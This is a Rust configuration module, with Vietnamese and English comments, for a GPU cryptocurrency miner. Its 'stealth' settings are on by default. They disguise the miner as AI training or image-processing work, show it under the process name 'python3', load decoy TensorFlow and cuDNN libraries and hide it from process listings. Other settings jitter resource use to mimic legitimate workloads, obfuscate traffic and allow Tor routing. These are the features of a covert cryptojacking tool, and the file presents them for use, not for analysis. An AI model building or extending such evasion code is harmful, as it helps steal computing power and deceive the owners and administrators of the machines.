// Module cấu hình hệ thống
// System configuration module

use anyhow::{Result, Context};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;

/// Cấu hình chính của hệ thống mining
/// Main mining system configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct Config {
    /// Cấu hình mining (mining configuration)
    pub mining: MiningConfig,
    
    /// Cấu hình GPU (GPU configuration)
    pub gpu: GpuConfig,
    
    /// Cấu hình stealth (stealth configuration)
    pub stealth: StealthConfig,
    
    /// Cấu hình network (network configuration)
    pub network: NetworkConfig,
    
    /// Cấu hình logging (logging configuration)
    pub logging: LoggingConfig,
    
    /// Stealth mode có được bật không (is stealth enabled)
    pub stealth_enabled: bool,
    
    /// Log level (mức độ log)
    pub log_level: String,
}

/// Cấu hình mining
/// Mining configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct MiningConfig {
    /// Thuật toán mining (kawpow, ethash, etc.)
    pub algorithm: String,
    
    /// Địa chỉ mining pool
    pub pool_address: String,
    
    /// Địa chỉ ví (wallet address)
    pub wallet_address: String,
    
    /// Worker name cho pool
    pub worker_name: String,
    
    /// Sử dụng TLS cho kết nối pool
    pub use_tls: bool,
    
    /// Intensity level (0-100)
    pub intensity: u8,
    
    /// Auto-switch algorithm theo profitability
    pub auto_switch: bool,
    
    /// Donation percentage (0-5%)
    pub dev_fee: f32,
}

/// Cấu hình GPU
/// GPU configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct GpuConfig {
    /// Danh sách GPU indices để sử dụng
    pub gpu_indices: Vec<u32>,
    
    /// CUDA compute capability tối thiểu
    pub min_compute_capability: f32,
    
    /// Memory clock offset (MHz)
    pub mem_clock_offset: i32,
    
    /// Core clock offset (MHz)
    pub core_clock_offset: i32,
    
    /// Power limit (percentage)
    pub power_limit: u32,
    
    /// Target temperature (Celsius)
    pub target_temp: u32,
    
    /// Max temperature trước khi throttle
    pub max_temp: u32,
    
    /// Fan speed mode (auto/manual/aggressive)
    pub fan_mode: String,
}

/// Cấu hình stealth mode
/// Stealth mode configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct StealthConfig {
    /// Wrapper mode (ai_training, image_processing, scientific_computing)
    pub wrapper_mode: WrapperMode,
    
    /// Process name để hiển thị
    pub process_name: String,
    
    /// Fake library paths để load
    pub fake_libs: Vec<String>,
    
    /// Mimic patterns của legitimate workloads
    pub mimic_patterns: bool,
    
    /// Random jitter cho resource usage (%)
    pub usage_jitter: u8,
    
    /// Thời gian giữa các pattern changes (giây)
    pub pattern_interval: u64,
    
    /// Hide từ process listing
    pub hide_process: bool,
    
    /// Obfuscate network traffic
    pub obfuscate_traffic: bool,
}

/// Wrapper modes cho stealth operation
#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum WrapperMode {
    /// Giả lập AI training workload
    AiTraining,
    /// Giả lập image processing workload  
    ImageProcessing,
    /// Giả lập scientific computing workload
    ScientificComputing,
    /// Giả lập AI inference workload
    AiInference,
    /// Custom wrapper với script riêng
    Custom(String),
}

/// Cấu hình network
/// Network configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct NetworkConfig {
    /// Proxy settings (nếu có)
    pub proxy: Option<ProxyConfig>,
    
    /// Connection timeout (giây)
    pub timeout: u64,
    
    /// Retry attempts khi connection fail
    pub retry_attempts: u32,
    
    /// Delay giữa các retry (giây)
    pub retry_delay: u64,
    
    /// DNS servers để sử dụng
    pub dns_servers: Vec<String>,
    
    /// Use Tor for anonymity
    pub use_tor: bool,
}

/// Proxy configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct ProxyConfig {
    /// Proxy type (socks5, http, https)
    pub proxy_type: String,
    
    /// Proxy address
    pub address: String,
    
    /// Proxy port
    pub port: u16,
    
    /// Username (nếu cần auth)
    pub username: Option<String>,
    
    /// Password (nếu cần auth)
    pub password: Option<String>,
}

/// Cấu hình logging
/// Logging configuration
#[derive(Debug, Clone, Deserialize, Serialize)]
pub struct LoggingConfig {
    /// Log directory path
    pub log_dir: PathBuf,
    
    /// Max log file size (MB)
    pub max_size_mb: u64,
    
    /// Max number of log files to keep
    pub max_files: u32,
    
    /// Log to stdout
    pub log_stdout: bool,
    
    /// Log to file
    pub log_file: bool,
    
    /// Encrypt logs
    pub encrypt_logs: bool,
    
    /// Remote logging endpoint
    pub remote_endpoint: Option<String>,
}

impl Config {
    /// Load configuration từ file hoặc environment
    /// Load configuration from file or environment
    pub fn load() -> Result<Self> {
        // Thử load từ file trước
        // Try loading from file first
        let config_path = std::env::var("CONFIG_PATH")
            .unwrap_or_else(|_| "config.toml".to_string());
        
        if std::path::Path::new(&config_path).exists() {
            Self::from_file(&config_path)
        } else {
            // Fallback to environment variables
            Self::from_env()
        }
    }
    
    /// Load configuration từ file
    /// Load configuration from file
    pub fn from_file(path: &str) -> Result<Self> {
        let contents = std::fs::read_to_string(path)
            .context("Failed to read config file")?;
        
        toml::from_str(&contents)
            .context("Failed to parse config file")
    }
    
    /// Load configuration từ environment variables
    /// Load configuration from environment variables
    pub fn from_env() -> Result<Self> {
        Ok(Self {
            mining: MiningConfig {
                algorithm: std::env::var("MINING_ALGO")
                    .unwrap_or_else(|_| "kawpow".to_string()),
                pool_address: std::env::var("POOL_ADDRESS")
                    .unwrap_or_else(|_| "stratum+tcp://pool.example.com:3333".to_string()),
                wallet_address: std::env::var("WALLET_ADDRESS")
                    .context("WALLET_ADDRESS not set")?,
                worker_name: std::env::var("WORKER_NAME")
                    .unwrap_or_else(|_| "gpu-worker".to_string()),
                use_tls: std::env::var("USE_TLS")
                    .unwrap_or_else(|_| "true".to_string())
                    .parse()?,
                intensity: std::env::var("INTENSITY")
                    .unwrap_or_else(|_| "75".to_string())
                    .parse()?,
                auto_switch: false,
                dev_fee: 1.0,
            },
            
            gpu: GpuConfig {
                gpu_indices: vec![0], // Default to first GPU
                min_compute_capability: 6.0,
                mem_clock_offset: 0,
                core_clock_offset: 0,
                power_limit: 80,
                target_temp: 70,
                max_temp: 85,
                fan_mode: "auto".to_string(),
            },
            
            stealth: StealthConfig {
                wrapper_mode: WrapperMode::AiTraining,
                process_name: "python3".to_string(),
                fake_libs: vec![
                    "libtensorflow.so".to_string(),
                    "libcudnn.so".to_string(),
                ],
                mimic_patterns: true,
                usage_jitter: 10,
                pattern_interval: 300,
                hide_process: true,
                obfuscate_traffic: true,
            },
            
            network: NetworkConfig {
                proxy: None,
                timeout: 30,
                retry_attempts: 3,
                retry_delay: 5,
                dns_servers: vec![
                    "8.8.8.8".to_string(),
                    "1.1.1.1".to_string(),
                ],
                use_tor: false,
            },
            
            logging: LoggingConfig {
                log_dir: PathBuf::from("/var/log/gpu-miner"),
                max_size_mb: 100,
                max_files: 5,
                log_stdout: true,
                log_file: true,
                encrypt_logs: false,
                remote_endpoint: None,
            },
            
            stealth_enabled: std::env::var("STEALTH_MODE")
                .unwrap_or_else(|_| "true".to_string())
                .parse()?,
                
            log_level: std::env::var("LOG_LEVEL")
                .unwrap_or_else(|_| "info".to_string()),
        })
    }
    
    /// Validate configuration
    pub fn validate(&self) -> Result<()> {
        // Kiểm tra wallet address format
        if self.mining.wallet_address.is_empty() {
            anyhow::bail!("Wallet address cannot be empty");
        }
        
        // Kiểm tra GPU indices
        if self.gpu.gpu_indices.is_empty() {
            anyhow::bail!("At least one GPU must be specified");
        }
        
        // Kiểm tra temperature limits
        if self.gpu.target_temp >= self.gpu.max_temp {
            anyhow::bail!("Target temperature must be less than max temperature");
        }
        
        // Kiểm tra intensity
        if self.mining.intensity > 100 {
            anyhow::bail!("Intensity must be between 0 and 100");
        }
        
        Ok(())
    }
}
